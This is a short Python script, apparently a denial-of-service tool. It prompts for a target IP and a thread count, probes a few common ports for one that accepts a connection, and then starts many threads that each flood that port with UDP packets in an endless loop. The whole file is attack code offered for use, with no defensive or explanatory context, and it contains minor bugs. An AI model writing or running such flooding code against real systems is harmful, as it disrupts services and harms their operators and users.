import os, threading, socket

target = input("Input Target IP \n> ")
threadno = input("Input No. of threads\n> ")
port = 0
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sockudp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
degports = [22,23,80,445,34,444]

for i in range (0, len(degports)):
    if port == 0:
        try:
            sock.connect((target, degports[i]))
            sock.close()
            port = degports[i]
            print("[+] port",degports[i],"connection secured")
        except:
            print("[-] port",degports[i],"connection failed")
print("[+] attack started on port", port)



def ping(target, port):
    while True:
        sockudp.sendto(bytes("00000000", "utf-8"), (target, port))
        print("sent")



start_thread  = threading.Thread(target= ping, name = "thread1", 
args = (target, port))

for i in range (0, int(threadno)):
    start_thread  = threading.Thread(target= ping, name = i, 
    args = (target, port))
    start_thread.start()
